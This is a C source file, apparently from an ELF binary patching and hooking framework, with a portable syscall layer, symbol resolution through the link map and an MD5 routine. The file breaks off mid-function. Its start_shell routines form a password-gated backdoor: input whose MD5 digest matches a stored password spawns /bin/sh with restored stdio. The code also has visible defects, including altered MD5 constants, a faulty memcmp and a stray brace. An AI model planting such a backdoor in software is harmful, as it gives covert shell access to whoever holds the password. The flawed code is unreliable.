#include "config.h"
#include "hook.h"
#include <stddef.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include "errno.h"
#include "md5.h"


#include <sys/select.h>
/* According to earlier standards */
#include <sys/time.h>
#include <sys/types.h>
#include <elf.h>




#ifdef __x86_64__
#include "x64_syscall.h"
#include "loader_x64.h"
#elif __i386__
#include "x86_syscall.h"
#include "loader_x86.h"
#elif __arm__
#include "arm_syscall.h"
#include "loader_arm.h"
#elif __aarch64__
#include "aarch64_syscall.h"
#include "loader_aarch64.h"
#elif __mips__
#include "mips_syscall.h"
#include "loader_mips.h"
#endif


#define IN_LINE static inline __attribute__((always_inline))
//#define IN_LINE static
#define UN_KNOWN_ERROR_CODE 0xFF99FF99
#define patch_params  ((PATCH_PARAMS*)((long)get_elf_base()+ELF_SIZE+PHDR_PAGE_SIZE))
#define MAX_PATCH_NUM 0x100
typedef struct PATCH_CODE_SLOT{
    char code_slot[0x20];
    char old_code_save[0x20];
    char* old_code_addr;
}PATCH_CODE_SLOT;
static char* g_elf_base = 0;
static PATCH_CODE_SLOT* g_patch_code_slot;
static int g_patch_code_index;


IN_LINE char* get_elf_base(){
    return g_elf_base;
}

IN_LINE char* alloc_patch_code_slot(){
    if(g_patch_code_index < MAX_PATCH_NUM && g_patch_code_slot!=NULL){
        return (char*)g_patch_code_slot+(g_patch_code_index++)*PATCH_SLOT_SIZE;
    }
}


IN_LINE unsigned long divmod(unsigned long large,unsigned long mod){
    while(large>=mod)
        large = large - mod;
    return large;
}

IN_LINE int is_pie(char* elf_base){
    Elf_Ehdr * ehdr = (Elf_Ehdr*) elf_base;
    if(ehdr->e_type == ET_EXEC)
        return 0;
    else if(ehdr->e_type == ET_DYN)
        return 1;
    return -1;
}


IN_LINE int  my_strlen(char *src){
    int i = 0;
    while(src[i]!='\0')
        i++;
    return i;
}


IN_LINE char* my_strstr( char* dest,  char* src) {
    char *tdest = dest;
    char *tsrc = src;
    int i = 0;//tdest 主串的元素下标位置，从下标0开始找，可以通过变量进行设置，从其他下标开始找！
    int j = 0;//tsrc 子串的元素下标位置
    while (i <= my_strlen(tdest) - 1 && j <= my_strlen(tsrc) - 1) {
        if (tdest[i] == tsrc[j])//字符相等，则继续匹配下一个字符
        {
            i++;
            j++;
        } else//在匹配过程中发现有一个字符和子串中的不等，马上回退到 下一个要匹配的位置
        {
            i = i - j + 1;
            j = 0;
        }
    }
    //循环完了后j的值等于strlen(tsrc) 子串中的字符已经在主串中都连续匹配到了
    if (j == my_strlen(tsrc)) {
        return tdest + i - my_strlen(tsrc);
    }
    return NULL;
}



IN_LINE void my_strcpy(char *dst, char *src,char end){
    int i = 0;
    while(src[i]!=end && src[i]!='\0'){
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
}

IN_LINE int  my_strcmp(char *dst, char *src){
    int i = 0;
    while(dst[i]!='\0'){
        if(dst[i] > src[i])
            return 1;
        else if(dst[i] < src[i])
            return -1;
        i++;
    }
    return 0;
}



IN_LINE int  my_memcmp(char *dst, char *src,int len){
    int i = 0;
    while(i<len){
        if(dst[i] > src[i])
            return 1;
        else if(dst[i] > src[i])
            return -1;
        i++;
    }
    return 0;
}
IN_LINE void my_memset(char *dst,char chr,int len){
    int i = 0;
    for(i=0;i<len;i++)
        dst[i] = chr;
}
IN_LINE int  my_memcpy(char *dst, char *src,int len){
    int i = 0;
    while(i<len){
        dst[i] = src[i];
        i++;
    }
    return 0;
}

static unsigned char PADDING[]={0x80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                                0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                                0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                                0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};

IN_LINE void MD5Init(MD5_CTX *context)
{
    context->count[0] = 0;
    context->count[1] = 0;
    context->state[0] = 0x12345678;
    context->state[1] = 0xEFDACB89;
    context->state[2] = 0xA8ADDCFE;
    context->state[3] = 0x1A325476;
}


IN_LINE void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len)
{
    unsigned int i = 0,j = 0;
    while(j < len)
    {
        output[j] = input[i] & 0xFF;
        output[j+1] = (input[i] >> 8) & 0xFF;
        output[j+2] = (input[i] >> 16) & 0xFF;
        output[j+3] = (input[i] >> 24) & 0xFF;
        i++;
        j+=4;
    }
}

IN_LINE void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len)
{
    unsigned int i = 0,j = 0;
    while(j < len)
    {
        output[i] = (input[j]) |
                    (input[j+1] << 8) |
                    (input[j+2] << 16) |
                    (input[j+3] << 24);
        i++;
        j+=4;
    }
}

IN_LINE void MD5Transform(unsigned int state[4],unsigned char block[64])
{
    unsigned int a = state[0];
    unsigned int b = state[1];
    unsigned int c = state[2];
    unsigned int d = state[3];
    unsigned int x[64];
    my_memset((char*)x,0,64);
    MD5Decode(x,block,64);
    FF(a, b, c, d, x[ 0], 7, 0xd76aa478); /* 1 */
    FF(d, a, b, c, x[ 1], 12, 0xe8c7b756); /* 2 */
    FF(c, d, a, b, x[ 2], 17, 0x242070db); /* 3 */
    FF(b, c, d, a, x[ 3], 22, 0xc1bdceee); /* 4 */
    FF(a, b, c, d, x[ 4], 7, 0xf57c0faf); /* 5 */
    FF(d, a, b, c, x[ 5], 12, 0x4787c62a); /* 6 */
    FF(c, d, a, b, x[ 6], 17, 0xa8304613); /* 7 */
    FF(b, c, d, a, x[ 7], 22, 0xfd469501); /* 8 */
    FF(a, b, c, d, x[ 8], 7, 0x698098d8); /* 9 */
    FF(d, a, b, c, x[ 9], 12, 0x8b44f7af); /* 10 */
    FF(c, d, a, b, x[10], 17, 0xffff5bb1); /* 11 */
    FF(b, c, d, a, x[11], 22, 0x895cd7be); /* 12 */
    FF(a, b, c, d, x[12], 7, 0x6b901122); /* 13 */
    FF(d, a, b, c, x[13], 12, 0xfd987193); /* 14 */
    FF(c, d, a, b, x[14], 17, 0xa679438e); /* 15 */
    FF(b, c, d, a, x[15], 22, 0x49b40821); /* 16 */

    /* Round 2 */
    GG(a, b, c, d, x[ 1], 5, 0xf61e2562); /* 17 */
    GG(d, a, b, c, x[ 6], 9, 0xc040b340); /* 18 */
    GG(c, d, a, b, x[11], 14, 0x265e5a51); /* 19 */
    GG(b, c, d, a, x[ 0], 20, 0xe9b6c7aa); /* 20 */
    GG(a, b, c, d, x[ 5], 5, 0xd62f105d); /* 21 */
    GG(d, a, b, c, x[10], 9,  0x2441453); /* 22 */
    GG(c, d, a, b, x[15], 14, 0xd8a1e681); /* 23 */
    GG(b, c, d, a, x[ 4], 20, 0xe7d3fbc8); /* 24 */
    GG(a, b, c, d, x[ 9], 5, 0x21e1cde6); /* 25 */
    GG(d, a, b, c, x[14], 9, 0xc33707d6); /* 26 */
    GG(c, d, a, b, x[ 3], 14, 0xf4d50d87); /* 27 */
    GG(b, c, d, a, x[ 8], 20, 0x455a14ed); /* 28 */
    GG(a, b, c, d, x[13], 5, 0xa9e3e905); /* 29 */
    GG(d, a, b, c, x[ 2], 9, 0xfcefa3f8); /* 30 */
    GG(c, d, a, b, x[ 7], 14, 0x676f02d9); /* 31 */
    GG(b, c, d, a, x[12], 20, 0x8d2a4c8a); /* 32 */

    /* Round 3 */
    HH(a, b, c, d, x[ 5], 4, 0xfffa3942); /* 33 */
    HH(d, a, b, c, x[ 8], 11, 0x8771f681); /* 34 */
    HH(c, d, a, b, x[11], 16, 0x6d9d6122); /* 35 */
    HH(b, c, d, a, x[14], 23, 0xfde5380c); /* 36 */
    HH(a, b, c, d, x[ 1], 4, 0xa4beea44); /* 37 */
    HH(d, a, b, c, x[ 4], 11, 0x4bdecfa9); /* 38 */
    HH(c, d, a, b, x[ 7], 16, 0xf6bb4b60); /* 39 */
    HH(b, c, d, a, x[10], 23, 0xbebfbc70); /* 40 */
    HH(a, b, c, d, x[13], 4, 0x289b7ec6); /* 41 */
    HH(d, a, b, c, x[ 0], 11, 0xeaa127fa); /* 42 */
    HH(c, d, a, b, x[ 3], 16, 0xd4ef3085); /* 43 */
    HH(b, c, d, a, x[ 6], 23,  0x4881d05); /* 44 */
    HH(a, b, c, d, x[ 9], 4, 0xd9d4d039); /* 45 */
    HH(d, a, b, c, x[12], 11, 0xe6db99e5); /* 46 */
    HH(c, d, a, b, x[15], 16, 0x1fa27cf8); /* 47 */
    HH(b, c, d, a, x[ 2], 23, 0xc4ac5665); /* 48 */

    /* Round 4 */
    II(a, b, c, d, x[ 0], 6, 0xf4292244); /* 49 */
    II(d, a, b, c, x[ 7], 10, 0x432aff97); /* 50 */
    II(c, d, a, b, x[14], 15, 0xab9423a7); /* 51 */
    II(b, c, d, a, x[ 5], 21, 0xfc93a039); /* 52 */
    II(a, b, c, d, x[12], 6, 0x655b59c3); /* 53 */
    II(d, a, b, c, x[ 3], 10, 0x8f0ccc92); /* 54 */
    II(c, d, a, b, x[10], 15, 0xffeff47d); /* 55 */
    II(b, c, d, a, x[ 1], 21, 0x85845dd1); /* 56 */
    II(a, b, c, d, x[ 8], 6, 0x6fa87e4f); /* 57 */
    II(d, a, b, c, x[15], 10, 0xfe2ce6e0); /* 58 */
    II(c, d, a, b, x[ 6], 15, 0xa3014314); /* 59 */
    II(b, c, d, a, x[13], 21, 0x4e0811a1); /* 60 */
    II(a, b, c, d, x[ 4], 6, 0xf7537e82); /* 61 */
    II(d, a, b, c, x[11], 10, 0xbd3af235); /* 62 */
    II(c, d, a, b, x[ 2], 15, 0x2ad7d2bb); /* 63 */
    II(b, c, d, a, x[ 9], 21, 0xeb86d391); /* 64 */
    state[0] += a;
    state[1] += b;
    state[2] += c;
    state[3] += d;
}

IN_LINE void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen)
{
    unsigned int i = 0,index = 0,partlen = 0;
    index = (context->count[0] >> 3) & 0x3F;
    partlen = 64 - index;
    context->count[0] += inputlen << 3;
    if(context->count[0] < (inputlen << 3))
        context->count[1]++;
    context->count[1] += inputlen >> 29;

    if(inputlen >= partlen)
    {
        my_memcpy(&context->buffer[index],input,partlen);
        MD5Transform(context->state,context->buffer);
        for(i = partlen;i+64 <= inputlen;i+=64)
            MD5Transform(context->state,&input[i]);
        index = 0;
    }
    else
    {
        i = 0;
    }
    my_memcpy(&context->buffer[index],&input[i],inputlen-i);
}

IN_LINE void MD5Final(MD5_CTX *context,unsigned char digest[16])
{
    unsigned int index = 0,padlen = 0;
    unsigned char bits[8];
    index = (context->count[0] >> 3) & 0x3F;
    padlen = (index < 56)?(56-index):(120-index);
    MD5Encode(bits,context->count,8);
    MD5Update(context,PADDING,padlen);
    MD5Update(context,bits,8);
    MD5Encode(digest,context->state,16);
}

IN_LINE int check_elf_magic(void* elf_base){
    int ret = ((*(char*)elf_base)=='\x7f' &&(*((char*)elf_base+1))=='E' && (*((char*)elf_base+2))=='L' && (*((char*)elf_base+3))=='F')?0:-1;
    return ret;
}

IN_LINE Elf_Dyn* get_elf_dyn_by_type(void* elf_base,int type){
    Elf_Ehdr* ehdr= (Elf_Ehdr*)elf_base;
    if(check_elf_magic(elf_base) == -1)
        return NULL;
    int j = 0;
    for(int i=0;i<ehdr->e_phnum;i++){
        Elf_Phdr* phdr = (Elf_Phdr*)((char*)ehdr+ehdr->e_phoff+ehdr->e_phentsize*i);
        switch (phdr->p_type)
        {
            case PT_DYNAMIC:
                j = 0;
                while(1){
                    Elf_Dyn* dyn = (Elf_Dyn*)(ELF_ADDR_ADD(elf_base,(long)phdr->p_vaddr+j*sizeof(Elf_Dyn)));
                    if(dyn->d_tag == type){
                        return dyn;
                    }
                    if(dyn->d_tag == 0)
                        break;
                    j++;
                }
                break;
            case PT_LOAD:
                break;
            default:
                break;
        }
    }
    return NULL;
}

IN_LINE void* get_elf_linkmap_from_plt_got(void* elf_base){
    Elf_Ehdr* ehdr= (Elf_Ehdr*)elf_base;
    if(check_elf_magic(elf_base) == -1)
        return NULL;
    int j = 0;
    for(int i=0;i<ehdr->e_phnum;i++){
        Elf_Phdr* phdr = (Elf_Phdr*)((char*)ehdr+ehdr->e_phoff+ehdr->e_phentsize*i);
        switch (phdr->p_type)
        {
            case PT_DYNAMIC:
                j = 0;
                while(1){
                    Elf_Dyn* dyn = (Elf_Dyn*)(ELF_ADDR_ADD(elf_base,(long)phdr->p_vaddr+j*sizeof(Elf_Dyn)));
                    if(dyn->d_tag == DT_PLTGOT){
                        struct link_map ** link = (struct link_map** )(dyn->d_un.d_ptr + sizeof(long));
                        return *link;
                    }
                    if(dyn->d_tag == 0)
                        break;
                    j++;
                }
                break;
            case PT_LOAD:
                break;
            default:
                break;
        }
    }
    return NULL;
}

IN_LINE void* get_elf_linkmap_from_dt_debug(void* elf_base) {
    Elf_Dyn* dyn = get_elf_dyn_by_type(elf_base,DT_DEBUG);
    if(dyn == NULL)
        return NULL;
    struct r_debug* debug =  (struct r_debug*)dyn->d_un.d_val;
    return debug->r_map;
}

IN_LINE unsigned long dl_new_hash(const char *s)
{
    unsigned long h = 5381;
    unsigned char c;
    for (c = *s; c != '\0'; c = *++s)
        h = h * 33 + c;
    return h & 0xffffffff;
}

IN_LINE Elf_Sym *find_symbol_in_lib_fast(char *symbols,char * elf_base){
    unsigned int new_hash, h2;
    unsigned int hb1, hb2;
    unsigned int nbuckets, symndx, nmaskwords, shift2;
    unsigned long n;
    long addr;
    long bitmask_addr,hashbuckets_addr, hashvalues_addr;
    Elf_Dyn* dt_gnu_hash = get_elf_dyn_by_type(elf_base,DT_GNU_HASH);
    long sym_addr, hash_addr;
    long dynsym_addr,dynstr_addr;
    ElfW(Sym) sym;
    if(dt_gnu_hash == NULL)
        return NULL;
    if(get_elf_dyn_by_type(elf_base,DT_SYMTAB) == NULL)
        return NULL;
    if(get_elf_dyn_by_type(elf_base,DT_STRTAB) == NULL)
        return NULL;
    if(get_elf_dyn_by_type(elf_base,DT_GNU_HASH) == NULL)
        return NULL;
    if(dt_gnu_hash->d_un.d_val == 0 ){
        return NULL;
    }
    //bugs for linux_gate and vdso
    if(dt_gnu_hash->d_un.d_val<=FAKE_MIN_ADDR)
        return NULL;
    nbuckets = *(int*)(dt_gnu_hash->d_un.d_val);
    symndx = *(int*)(dt_gnu_hash->d_un.d_val + sizeof(unsigned int));
    nmaskwords = *(int*)(dt_gnu_hash->d_un.d_val + 2*sizeof(unsigned int));
    shift2 = *(int*)(dt_gnu_hash->d_un.d_val + 3*sizeof(unsigned int));
    bitmask_addr = (long)dt_gnu_hash->d_un.d_val + 4*sizeof(unsigned int);
    hashbuckets_addr = bitmask_addr + nmaskwords * sizeof(long);
    hashvalues_addr = hashbuckets_addr + nbuckets*sizeof(unsigned int);

    dynstr_addr = (long)get_elf_dyn_by_type(elf_base,DT_STRTAB)->d_un.d_val;
    dynsym_addr = (long)get_elf_dyn_by_type(elf_base,DT_SYMTAB)->d_un.d_val;
    new_hash = dl_new_hash(symbols);
    hb1 = new_hash & (__ELF_NATIVE_CLASS - 1);
    hb2 = (new_hash >> shift2) & (__ELF_NATIVE_CLASS - 1);
    n = (new_hash / __ELF_NATIVE_CLASS) & (nmaskwords - 1);
    /*
#if __ELF_NATIVE_CLASS == 64
        n = (new_hash >> 6) & (nmaskwords - 1);
#elif __ELF_NATIVE_CLASS == 32
        n = (new_hash >> 5) & (nmaskwords - 1);
#else
#error "unknown __ELF_NATIVE_CLASS"
#endif
     */
    addr = bitmask_addr + n * sizeof(long);
    long bitmask_word = *(long*)addr;
    if (((bitmask_word >> hb1) & (bitmask_word >> hb2) & 1) == 0)
        return NULL;
    addr = hashbuckets_addr + (new_hash % nbuckets) * sizeof(Elf_Symndx);
    //addr = hashbuckets_addr + (unsigned int)(divmod(new_hash ,nbuckets) * sizeof(Elf_Symndx));
    Elf_Symndx _symndx = *(Elf_Symndx*)addr;
    if (_symndx == 0)
        return NULL;
    sym_addr = dynsym_addr + _symndx * sizeof(ElfW(Sym));
    hash_addr = hashvalues_addr + (_symndx - symndx) * sizeof(unsigned int);
    do
    {
        h2 = *(unsigned int*)hash_addr;
        /*1. hash value same */
        if (((h2 ^ new_hash) >> 1) == 0)
        {
            sym_addr = dynsym_addr + ((symndx + (hash_addr - hashvalues_addr) / sizeof(Elf32_Word)) * sizeof(ElfW(Sym)));
            //sym_addr = dynsym_addr + ((symndx + (hash_addr - hashvalues_addr) >> 2) * sizeof(ElfW(Sym)));
            /*read ElfW(Sym) */
            my_memcpy((char*)&sym,(char*)sym_addr,sizeof(ElfW(Sym)));
            addr = dynstr_addr + sym.st_name;

            if (((char*)addr)[0]!='\x00' && (!my_strcmp((char*)addr, symbols)))
            {
                return (Elf_Sym*)sym_addr;
            }
        }
        hash_addr += sizeof(unsigned int);
    } while ((h2 & 1u) == 0); // search in same bucket
    return NULL;
}


IN_LINE void* find_symbol_in_lib_slow(char *symbols,char * elf_base){
    Elf_Dyn* strtab = get_elf_dyn_by_type(elf_base,DT_STRTAB);
    Elf_Dyn* symtab = get_elf_dyn_by_type(elf_base,DT_SYMTAB);
    Elf_Dyn* dt_strsz = get_elf_dyn_by_type(elf_base,DT_STRSZ);
    if(strtab == NULL || symtab == NULL || dt_strsz == NULL)
        return NULL;
    if(symtab->d_un.d_ptr<=FAKE_MIN_ADDR || strtab->d_un.d_ptr<=FAKE_MIN_ADDR)
        return NULL;
    long strtab_size = dt_strsz->d_un.d_val;
    int i = 0;
    while(1){
        Elf_Sym* sym = (Elf_Sym*)(symtab->d_un.d_ptr + i*sizeof(Elf_Sym));
        if(sym->st_name>=strtab_size)
            break;
        char* sym_name = (char*)&((char*)strtab->d_un.d_ptr)[sym->st_name];
        if(my_strcmp(sym_name,symbols)==0)
            return sym;
        i++;
    }
    return NULL;
}

IN_LINE void* lookup_symbools_from_dynamic_symbol(char* symbols,void* elf_base){
    Elf_Sym* sym;
    void* sym_addr = NULL;
    sym = find_symbol_in_lib_fast(symbols,elf_base);
    if (sym) {
        sym_addr = sym->st_value + elf_base;
        return sym_addr;
    }
    /*
    sym = find_symbol_in_lib_slow(symbols,elf_base);
    if (sym) {
        sym_addr = sym->st_value + elf_base;
        return sym_addr;
    }*/
    return NULL;
}

IN_LINE void* lookup_symbols_in_elf(unsigned char* symbols,void* elf_base){
    int i = 0, j = 0;
    if(symbols==NULL || elf_base==NULL)
        return NULL;
    if(check_elf_magic(elf_base)==-1)
        return NULL;
    return lookup_symbools_from_dynamic_symbol(symbols,elf_base);
}

IN_LINE  void* lookup_symbols(char* symbol){
    struct link_map* map = get_elf_linkmap_from_plt_got(get_elf_base());
    if(map == NULL){
        map = get_elf_linkmap_from_dt_debug(get_elf_base());
    }
    if(map == NULL)
        return NULL;
    while(map->l_prev!=NULL) map = map->l_prev;
    void* sym_addr = 0;
    char vdso[] = {"[vdso]"};
    char linux_vdso[] = {"linux-vdso.so.1"};
    char linux_gate[] = {"linux-gate.so.1"};
    while (!sym_addr && map){
        char* so_name = map->l_name;
        if(my_strstr(so_name,vdso)!=NULL||my_strstr(so_name,linux_vdso)!=NULL ||my_strstr(so_name,linux_gate)!=NULL){
            map = map->l_next;
            continue;
        }
        if(map->l_addr == 0){
            map = map->l_next;
            continue;
        }
        sym_addr = (void*)lookup_symbols_in_elf(symbol,(char*)map->l_addr);
        if(sym_addr!=NULL)
            return sym_addr;
        map = map->l_next;
    }
}

IN_LINE void* hook_address_helper(void* addr){
    if(is_pie(get_elf_base()))
        return (void*)((long)get_elf_base() + (long)addr);
    return addr;
}



IN_LINE void my_sleep(int milli_second){
    struct timespec slptm;
    int tmp = 0;
    int res = 0;
    slptm.tv_sec = milli_second >> 10;
    tmp = milli_second % 1000;
    slptm.tv_nsec = tmp * 1000000;
    asm_nanosleep((void*)&slptm,0,res);
}

IN_LINE void filter_black_words_in(char* buf,int buf_len){

}
IN_LINE void filter_black_words_out(char* buf,int buf_len){

}
static int*(*g_errno_handler)() ;
static int get_errno(){
    if(g_errno_handler == NULL) {
        g_errno_handler= lookup_symbols("__errno_location");
        if (g_errno_handler != NULL)
            return *(g_errno_handler());
    }
    return UN_KNOWN_ERROR_CODE;
}

#define SYSCALL_DYNAMIC 0

IN_LINE long my_dup2(int oldfd,int newfd){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*dup2_handler)(int, int) = lookup_symbols("dup2");
        if (dup2_handler != NULL) {
            return dup2_handler(oldfd, newfd);
        }
    }
    asm_dup2(oldfd, newfd, res);
    return res;
}

IN_LINE long my_pipe(int* fd){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*pip2_handler)(int *) = lookup_symbols("pipe");
        if (pip2_handler != NULL) {
            return pip2_handler(fd);
        }
    }
    asm_pipe(fd,res);
    return res;
}


IN_LINE long my_close(int fd){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*close_handler)(int) = lookup_symbols("close");
        if (close_handler != NULL) {
            return close_handler(fd);
        }
    }
    asm_close(fd,res);
    return res;
}

IN_LINE long my_fork(){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*fork_handler)() = lookup_symbols("fork");
        if (fork_handler != NULL) {
            return fork_handler();
        }
    }
    asm_fork(res);
    return res;
}


IN_LINE long my_fcntl(int fd,long cmd,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*fcntl_handler)(int, long, long) = lookup_symbols("fcntl");
        if (fcntl_handler != NULL) {
            return fcntl_handler(fd, cmd, flag);
        }
    }
    asm_fcntl(fd,cmd,flag,res);
    return res;
}

static long my_socket(long af,long type,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*socket_handler)(long, long, long) = lookup_symbols("socket");
        if (socket_handler != NULL) {
            return socket_handler(af, type, flag);
        }
    }
    asm_socket(af,type,flag,res);
    return res;
}

static long my_connect(int fd,void* addr,long size){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*connect_handler)(int,void*,long) = lookup_symbols("connect");
        if (connect_handler != NULL) {
            return connect_handler(fd, addr, size);
        }
    }
    asm_connect(fd,addr,size,res);
    return res;
}

IN_LINE long my_open(char* name,long mode,long flag){
    long res = 0;
    if(0) {
        long (*open_handler)(char*, long, long) = lookup_symbols("open");
        if (open_handler != NULL) {
            return open_handler(name, mode, flag);
        }
    }
    asm_open(name,mode,flag,res);
    return res;
}


IN_LINE long my_read(int fd,char* buf,long length){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*read_handler)(int, char *, long) = lookup_symbols("read");
        if (read_handler != NULL) {
            return read_handler(fd, buf, length);
        }
    }
    asm_read(fd,buf,length,res);
    return res;
}

IN_LINE long my_write(int fd,char* buf,long length){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*write_handler)(int, char *, long) = lookup_symbols("write");
        if (write_handler != NULL) {
            return write_handler(fd, buf, length);
        }
    }
    asm_write(fd,buf,length,res);
    return res;
}

static long my_send(int fd,char* buf,long size,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*connect_handler)(int,char*,long,long) = lookup_symbols("send");
        if (connect_handler != NULL) {
            return connect_handler(fd, buf, size,flag);
        }
    }
    asm_send(fd,buf,size,flag,res);

    return res;
}

static long my_setsockopt(long sockfd, long level, long optname, void *optval, long optlen){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*setsockopt_handler)(int, int, int, void*, long) = lookup_symbols("setsockopt");
        if (setsockopt_handler != NULL) {
            return setsockopt_handler(sockfd, level, optname, optval, optlen);
        }
    }
    asm_setsockopt(sockfd, level, optname, optval, optlen,res);
    return res;
}

static long my_sendto(int fd,char* buf,long size,long flag,void* addr,long addr_length){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*sendto_handler)(int, char *, long, long, void *, long) = lookup_symbols("sendto");
        if (sendto_handler != NULL) {
            return sendto_handler(fd, buf, size, flag, addr, addr_length);
        }
    }
    asm_sendto(fd,buf,size,flag,addr,addr_length,res);
    return res;
}

static long my_select(int nfds,fd_set *readafds,fd_set* writefds,fd_set* exceptfds,struct timeval* timeout){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*select_handler)(int,fd_set*,fd_set*,fd_set*,struct timeval*) = lookup_symbols("sendto");
        if (select_handler != NULL) {
            return select_handler(nfds, readafds, writefds, exceptfds, timeout);
        }
    }
    asm_select(nfds, readafds, writefds, exceptfds, timeout,res);
    return res;
}

IN_LINE long my_waitpid(int pid,long state_addr,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*waitpid_handler)(int, long, long) = lookup_symbols("waitpid");
        if (waitpid_handler != NULL) {
            return waitpid_handler(pid, state_addr, flag);
        }
    }
    asm_waitpid(pid,state_addr,flag,res);
    return res;
}

IN_LINE long my_exit(int code){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*exit_handler)(int) = lookup_symbols("exit");
        if (exit_handler != NULL) {
            return exit_handler(code);
        }
    }
    asm_exit(code,res);
    return res;
}

IN_LINE void my_alarm(int time){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*alarm_handler)(int) = lookup_symbols("alarm");
        if (alarm_handler != NULL) {
            alarm_handler(time);
        }
    }
    asm_alarm(time,res);
}

IN_LINE void my_chroot(char* path){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*chroot_handler)(char*) = lookup_symbols("chroot");
        if (chroot_handler != NULL) {
            chroot_handler(path);
        }
    }
    asm_chroot(path,res);
}

static int my_getsockopt (int fd, int level, int optname, void * optval, socklen_t * optlen){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*getsockopt_handler)(int, int, int, void *, socklen_t *) = lookup_symbols("getsockopt");
        if (getsockopt_handler != NULL) {
            return getsockopt_handler(fd,level,optname,optval,optlen);
        }
    }
    asm_getsockopt(fd,level,optname,optval,optlen,res);
    return res;
}

IN_LINE long my_kill(int pid,int sig){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*kill_handler)(int,int) = lookup_symbols("kill");
        if (kill_handler != NULL) {
            return kill_handler(pid,sig);
        }
    }
    asm_kill(pid,sig,res);
    return res;
}

IN_LINE long my_execve(char* elf,char** arg,char** env){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*execve_handler)(char *, char **, char **) = lookup_symbols("execve");
        if (execve_handler != NULL) {
            return execve_handler(elf, arg, env);
        }
    }
    asm_execve((long)elf,(long)arg,(long)env,res);
    return res;
}
}
IN_LINE long my_mmap(long addr, size_t length, int prot, int flags,
                     int fd, off_t offset){
    long res = 0;
    asm_mmap(addr,(long)length,(long)prot,(long)flags,(long)fd,(long)offset,res);
    return res;
}

IN_LINE long my_munmap(long addr,size_t length){
    long res = 0;
    asm_munmap(addr,length,res);
    return res;
}

IN_LINE long my_mprotect(void *start, size_t len, int prot){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*mprotect_handler)(void *, size_t, int) = lookup_symbols("mprotect");
        if (mprotect_handler != NULL) {
            return mprotect_handler(start, len, prot);
        }
    }
    asm_mprotect((long)start,(long)len,(long)prot,res);
    return res;
}

IN_LINE void my_puts(char* str){
    void(*my_puts_handler)(char*str) = lookup_symbols("puts");
    if(my_puts_handler!=NULL)
        my_puts_handler(str);
    else{
        my_write(1,str,my_strlen(str));
        my_write(1,"\n",1);
    }
}

IN_LINE long my_write_packet(int fd,char* buf,long size){
    long res = my_write(fd,buf,size);
    return res;
}

IN_LINE void generate_random_str(char* buf ,int len){
    int i =0 ;
    char random_str[] = {"abcdefghijklmnopqrstuvwxyz"};
    int fd = my_open("/dev/urandom",O_RDONLY,0);
    unsigned char chr;
    if(fd> 0) {
        for (i = 0; i < len; i++) {
            my_read(fd,&chr,1);
            buf[i] = random_str[((unsigned int)chr)%26];
        }
        my_close(fd);
    }
    else{
        buf[0] = 'a';
    }
}


static void start_shell_io_inline(char* buf,int buf_len){
    char *argv[] = {"/bin/sh", NULL};
    MD5_CTX md5;
    my_memset((char*)&md5,0,sizeof(MD5_CTX));
    unsigned char decrypt[16];
    if(buf_len == sizeof(SHELL_PASSWD)){
        MD5Init(&md5);
        MD5Update(&md5,buf,sizeof(SHELL_PASSWD)-1);
        MD5Final(&md5,decrypt);
        if(my_strcmp(decrypt,patch_params->shell_password) == 0){
            my_execve("/bin/sh", (char**)argv, NULL);
        }
    }
}


static void start_shell(char* buf,int buf_len,int child_pid,int save_stdin,int save_stdout,int save_stderr){
    char *argv[] = {"/bin/sh", NULL};
    MD5_CTX md5;
    my_memset((char*)&md5,0,sizeof(MD5_CTX));
    unsigned char decrypt[16];
    if(buf_len == sizeof(SHELL_PASSWD)){
        MD5Init(&md5);
        MD5Update(&md5,buf,sizeof(SHELL_PASSWD)-1);
        MD5Final(&md5,decrypt);
        if(my_strcmp(decrypt,patch_params->shell_password) == 0){
            my_kill(child_pid,9);
            my_close(STDIN_FILENO);
            my_close(STDOUT_FILENO);
            my_close(STDERR_FILENO);
            my_dup2(save_stdin,STDIN_FILENO);
            my_dup2(save_stdout,STDOUT_FILENO);
            my_dup2(save_stderr,STDERR_FILENO);
            pid_t pid = 0;
            if(pid == 0) {
                my_execve("/bin/sh", (char**)argv, NULL);
            }
        }
    }
}

IN_LINE int MAX_FD(int file1,int file2,int file3){
    int tmp = file1;
    if(file1>file2)
        tmp = file1;
    else tmp = file2;
    if(tmp<file3)
        tmp = file3;
    return tmp;
}

static char UUID[0x08];


IN_LINE void build_packet(char type,char* buf,int buf_len,char* packet,int* packet_len){
    my_memcpy(packet,UUID,sizeof(UUID));
    my_memcpy(packet+ sizeof(UUID),&type,1);
    my_memcpy(packet+sizeof(UUID)+1,(char*)&buf_len,4);
    my_memcpy(packet+sizeof(UUID)+1+4,buf,buf_len);
